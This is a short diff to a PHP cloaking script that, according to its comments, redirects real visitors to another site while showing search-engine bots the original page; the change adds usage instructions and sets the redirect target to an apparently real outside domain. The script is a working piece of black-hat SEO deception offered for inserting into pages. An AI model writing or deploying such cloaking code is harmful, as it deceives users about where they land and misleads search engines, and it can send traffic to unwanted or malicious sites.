@@ -5,9 +5,11 @@
 //	use this file to insert into any page you'd like to cloak
 //	by inserting this into your pages, you're able to redirect 
 //	real users to another page, while showing bots the original page
+//
+// 	insert into pages using  "include ("/full/path/to/page.php");"
  
 //redirect real users to...
-$usr_link = "http://my_site.com"; // This time it will be where USERS are redirected.
+$usr_link = "http://chaseclicks.com"; // This time it will be where USERS are redirected.
 
 //include the bot detection file
 include ("./bot_detection.php");
